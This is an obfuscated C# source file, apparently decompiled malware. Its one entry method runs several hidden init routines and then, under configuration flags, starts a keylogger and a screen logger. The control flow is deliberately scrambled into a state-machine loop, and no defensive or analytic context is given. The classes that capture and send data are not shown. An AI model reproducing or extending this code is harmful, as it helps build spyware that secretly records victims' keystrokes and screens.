using X5CZaoh;
using q9Ep;

namespace ppkr;

public static class _3UzST
{
	private static gkgI5YrQv _keyLogger;

	private static qgKJuj _screenLogger;

	public static void ilJpcEM8bsS()
	{
		int num = 0;
		do
		{
			if (num == 5)
			{
				_keyLogger = new gkgI5YrQv();
				num = 6;
			}
			if (num == 6)
			{
				_keyLogger.pKsga();
				num = 7;
			}
			if (num == 7)
			{
				goto IL_0067;
			}
			goto IL_007a;
			IL_007a:
			if (num == 3)
			{
				HaT.uqDcovklWyu();
				num = 4;
			}
			if (num == 2)
			{
				dBDNalx6.TG25DsxupuY();
				num = 3;
			}
			if (num == 1)
			{
				FZ9K2n1R.PFL7xV();
				num = 2;
			}
			if (num == 9)
			{
				_screenLogger.jvUbrj();
				num = 10;
			}
			if (num == 8)
			{
				_screenLogger = new qgKJuj();
				num = 9;
			}
			if (num == 4)
			{
				if (!dBDNalx6.EnableKeylogger)
				{
					goto IL_0067;
				}
				num = 5;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_0067:
			if (dBDNalx6.EnableScreenLogger)
			{
				num = 8;
				goto IL_007a;
			}
			break;
		}
		while (num != 10);
	}
}
